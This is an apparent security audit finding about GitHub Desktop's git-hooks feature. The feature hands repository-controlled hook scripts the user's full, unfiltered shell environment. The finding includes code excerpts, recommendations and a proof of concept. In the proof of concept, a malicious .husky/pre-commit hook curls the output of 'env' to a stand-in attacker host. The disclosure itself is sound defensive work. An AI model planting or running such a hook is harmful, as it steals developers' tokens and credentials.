## Finding

### Title
Git hooks executed by Desktop inherit the user's full, unfiltered shell environment, letting a repository-controlled hook script exfiltrate secrets - (File: app/src/lib/hooks/hooks-proxy.ts)

### Summary
GitHub Desktop's git-hooks feature (enabled by default since 3.5.5) executes hook scripts that live inside the repository's working tree (resolved via `core.hooksPath`, which can point to a tracked, repo-controlled directory such as the common `.husky/` convention) and hands them the **entire captured interactive-shell environment of the user**, with no secret filtering. A malicious/forked repository that ships a hooks directory can therefore exfiltrate any token or credential the victim has exported in their shell profile (`~/.bashrc`, `~/.zshrc`, PowerShell profile, etc.) the moment the victim performs an ordinary commit, pull, or merge in Desktop.

### Finding Description
`withHooksEnv` intercepts git-hook invocations for operations like commit/pull/merge [1](#0-0) . It discovers executable hooks via `getRepoHooks`, which resolves the hooks directory from the repo's own `core.hooksPath` config (falling back to `.git/hooks` only if unset) [2](#0-1) . `core.hooksPath` is frequently pointed at a version-controlled folder inside the repo (e.g. the widespread Husky convention `.husky/`), meaning the hook file content is part of what a repository author/contributor pushes.

When such a hook fires, `hooks-proxy.ts` builds the child process's environment by spawning the user's actual configured shell and capturing its *entire* exported environment via `getShellEnv`/`printenvz` [3](#0-2) . That full, unfiltered environment is then merged directly into the hook's `env` when it is spawned: [4](#0-3) 

```
env: { ...shellEnv.env, ...safeEnv, GITHUB_DESKTOP: '1' },
```

The `excludedEnvVars` deny-list (`GIT_SYSTEM_CONFIG`, `GIT_EXEC_PATH`, `GIT_CONFIG_PARAMETERS`, `GIT_ASKPASS`, `GIT_SSH_COMMAND`, etc.) is only applied to `safeEnv`, i.e. the `GIT_`/`GITHEAD_`-prefixed variables from the *proxy* environment [5](#0-4) [6](#0-5) . It is never applied to `shellEnv.env`, so nothing strips out secrets a developer has exported for everyday CLI convenience (e.g. `NPM_TOKEN`, `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, deploy keys) before they are handed to the repository-controlled hook binary.

This hook-with-full-shell-env feature is on by default: [7](#0-6) , and was rolled out as "Enable hooks support by default" / "Run hooks in user's shell environment" in the 3.5.5 series [8](#0-7) .

### Impact Explanation
An attacker who controls the content of a cloned/checked-out repository (a malicious fork, a compromised contributor branch, or a supply-chain-modified dependency repo) can plant or modify a `.husky`/hooks-directory script. As soon as the victim performs a normal Desktop action that triggers any intercepted hook (`pre-commit`, `post-checkout`, `post-merge`, `pre-push`, etc. — see the hook list intercepted for commit [9](#0-8)  and pull [10](#0-9) ), the attacker's script executes with the victim's complete shell environment, enabling silent exfiltration of any credential/token exported there and full code execution as the user.

### Likelihood Explanation
The feature is enabled by default, hooks are executed as part of everyday workflows (commit/pull/merge) with no additional user prompt beyond the normal "unsafe/untrusted directory" ownership check (which does not evaluate the *content* of tracked hook scripts) [11](#0-10) , and pointing `core.hooksPath` at a repo-tracked directory is an extremely common, unremarkable convention (Husky and similar tools) rather than an unusual attacker setup.

### Recommendation
- Do not merge the fully captured shell environment unfiltered into the hook process; apply an allow-list (as already done for `safeEnv`) or a deny-list targeting common secret-bearing variable name patterns (`*TOKEN*`, `*SECRET*`, `*KEY*`, `*PASSWORD*`, cloud-provider prefixes) before injecting `shellEnv.env` into hook execution.
- Extend the existing "untrusted/unsafe repository" trust gate so that hooks resolving to a path *inside the tracked working tree* (as opposed to the classic untracked `.git/hooks`) require explicit user trust/review before Desktop executes them with shell-level environment access.
- Consider surfacing the hook script that is about to run (path/content) the first time it triggers for a newly opened/cloned repository.

### Proof of Concept
1. Attacker forks/creates a project using the common Husky convention, committing `.husky/pre-commit`:
   ```sh
   #!/bin/sh
   curl -s https://evil.example/collect --data-urlencode "env=$(env)"
   ```
   with `core.hooksPath=.husky` set (either tracked in a committed setup script or already present after the project's documented `npm install`).
2. Victim clones/opens this repository in GitHub Desktop (hooks feature on by default).
3. Victim stages a change and clicks **Commit**, invoking `createCommit()` which intercepts `pre-commit` [9](#0-8) .
4. `withHooksEnv`/`getRepoHooks` locate `.husky/pre-commit`, and `hooks-proxy.ts` spawns it with `env: { ...shellEnv.env, ... }`, where `shellEnv.env` is the victim's full captured shell environment [4](#0-3) .
5. Any secret exported in the victim's shell profile is exfiltrated to the attacker's server, without any warning distinct from a normal commit.

```typescript
export async function withHooksEnv<T>(
  fn: (env: Record<string, string | undefined> | undefined) => Promise<T>,
  path: string,
  opts: IGitExecutionOptions | undefined
): Promise<T> {
  if (!opts?.interceptHooks || !getHooksEnvEnabled()) {
    return fn(opts?.env)
  }

  const hooks = await Array.fromAsync(getRepoHooks(path, opts.interceptHooks))

  if (hooks.length === 0) {
    return fn(opts?.env)
  }
```

```typescript
export const getShellEnv = async (
  cwd?: string,
  shellKind?: SupportedHooksEnvShell,
  printenvzPath?: string
): Promise<ShellEnvResult> => {
  const ext = __WIN32__ ? '.exe' : ''
  printenvzPath ??= join(__dirname, `printenvz${ext}`)

  const shellInfo = await getShell(shellKind)

  if (!shellInfo) {
    return { kind: 'failure', shellKind }
  }

  const { shell, args, quoteCommand, windowsVerbatimArguments, argv0 } =
    shellInfo

  return await new Promise((resolve, reject) => {
    const child = spawn(shell, [...args, quoteCommand(printenvzPath)], {
      env: {},
      windowsVerbatimArguments,
      argv0,
      stdio: 'pipe',
      cwd,
    })
```
